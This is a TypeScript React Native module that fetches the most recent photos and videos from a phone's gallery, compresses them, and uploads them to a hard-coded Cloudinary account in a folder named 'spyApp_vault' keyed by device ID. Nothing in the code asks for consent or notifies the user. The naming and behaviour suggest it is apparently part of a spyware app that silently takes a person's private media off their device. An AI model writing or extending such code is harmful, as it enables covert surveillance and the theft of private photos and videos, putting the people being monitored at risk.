import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';

const CLOUD_NAME = 'dgbjpy7ev';
const UPLOAD_PRESET = 'sypapp';
const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

// Session-level cache — is app session mein jo files upload ho gayi hain
const globalUploadedFileIds = new Set<string>();

export interface MediaItem {
  url: string;
  fileId: string;
  mediaType: string;
}

export const scanAndUploadGallery = async (
  deviceId: string,
  sessionCache?: Set<string>,
): Promise<MediaItem[]> => {
  try {
    // ─── Gallery se photos/videos fetch karo ──────────────────────────────
    const photos = await CameraRoll.getPhotos({
      first: 20,
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
    });

    console.log(`[Gallery] Total fetched: ${photos.edges.length} items`);

    const uploadedItems: MediaItem[] = [];
    const targetFolder = `spyApp_vault/${deviceId}`;

    for (const edge of photos.edges) {
      const node = edge.node as any;
      const fileUri = node.image.uri;
      const isVideo = node.type && node.type.startsWith('video');

      // ─── Stable unique file ID ────────────────────────────────────────────
      // URI use karo as fileId — most reliable identifier
      const fileId = fileUri;

      // ─── Duplicate check ──────────────────────────────────────────────────
      if (globalUploadedFileIds.has(fileId)) {
        console.log(`[Gallery] Already uploaded, skip: ${fileId.slice(-30)}`);
        continue;
      }
      if (sessionCache && sessionCache.has(fileId)) {
        continue;
      }

      // ─── Video: 60 seconds se badi skip ──────────────────────────────────
      if (isVideo) {
        const duration = node.playableDuration || node.duration || 0;
        if (duration > 60) {
          console.log(`[Gallery] Skip long video: ${Math.round(duration)}s`);
          continue;
        }
      }

      // ─── Image compression ────────────────────────────────────────────────
      let processedUri = fileUri;
      if (!isVideo) {
        try {
          const resized = await ImageResizer.createResizedImage(
            fileUri,
            1280,
            1280,
            'JPEG',
            80,
            0,
            undefined,
          );
          processedUri = resized.uri;
          console.log(`[Gallery] Image compressed successfully`);
        } catch (err) {
          console.warn('[Gallery] Compression failed, using original:', err);
        }
      }

      // ─── Cloudinary upload ────────────────────────────────────────────────
      try {
        const fileName = `upload_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;

        const formData = new FormData();
        formData.append('file', {
          uri: processedUri,
          type: isVideo ? 'video/mp4' : 'image/jpeg',
          name: fileName,
        } as any);
        formData.append('upload_preset', UPLOAD_PRESET);
        formData.append('folder', targetFolder);
        // NOTE: public_id mat bhejo — folder + auto name se Cloudinary handle kare ga

        console.log(`[Gallery] Uploading ${isVideo ? 'video' : 'image'} to Cloudinary...`);

        const res = await axios.post(CLOUDINARY_URL, formData, {
          headers: { 'Content-Type': 'multipart/form-data' },
          timeout: 60000, // 60 second timeout
        });

        if (res.data?.secure_url) {
          console.log(`[Gallery] Upload success: ${res.data.secure_url.slice(-40)}`);
          uploadedItems.push({
            url: res.data.secure_url,
            fileId: fileId,
            mediaType: isVideo ? 'video' : 'image',
          });

          globalUploadedFileIds.add(fileId);
          if (sessionCache) sessionCache.add(fileId);
        } else {
          console.warn('[Gallery] Upload returned no URL:', res.data);
        }
      } catch (uploadErr: any) {
        const status = uploadErr?.response?.status;
        const errMsg = uploadErr?.response?.data?.error?.message || uploadErr?.message;

        if (status === 400 || status === 409) {
          console.log(`[Gallery] Already on Cloudinary (${status}), caching: ${fileId.slice(-20)}`);
          globalUploadedFileIds.add(fileId);
          if (sessionCache) sessionCache.add(fileId);
        } else {
          console.error(`[Gallery] Upload failed (${status}): ${errMsg}`);
        }
      }
    }

    console.log(`[Gallery] Done — ${uploadedItems.length} new items uploaded`);
    return uploadedItems;

  } catch (error: any) {
    console.error('[Gallery] CameraRoll error:', error?.message || error);
    return [];
  }
};